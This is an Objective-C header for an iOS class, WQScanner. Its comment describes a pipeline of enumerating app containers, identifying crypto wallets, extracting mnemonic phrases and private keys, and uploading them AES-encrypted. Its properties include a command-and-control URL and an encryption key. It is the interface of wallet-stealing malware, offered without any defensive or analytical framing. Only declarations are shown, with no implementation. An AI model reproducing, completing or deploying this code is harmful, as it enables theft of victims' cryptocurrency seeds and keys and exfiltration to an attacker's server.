//
//  WQScanner.h
//  容器枚举 → 钱包识别 → 助记词/私钥提取 → AES 上传
//
#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@interface WQScanner : NSObject

@property (nonatomic, copy)   NSString *appGroup;
@property (nonatomic, copy)   NSString *c2URL;
@property (nonatomic, strong) NSData   *aesKey;
@property (nonatomic, assign) BOOL      walletOnly;

@property (nonatomic, copy, nullable) void (^progressBlock)(NSString *msg);
@property (nonatomic, copy, nullable) void (^finishBlock)(NSInteger containers,
                                                         NSInteger hits,
                                                         NSError *_Nullable err);

@property (nonatomic, readonly) NSInteger scannedContainers;
@property (nonatomic, readonly) NSInteger hitCount;

- (void)start;

@end

NS_ASSUME_NONNULL_END
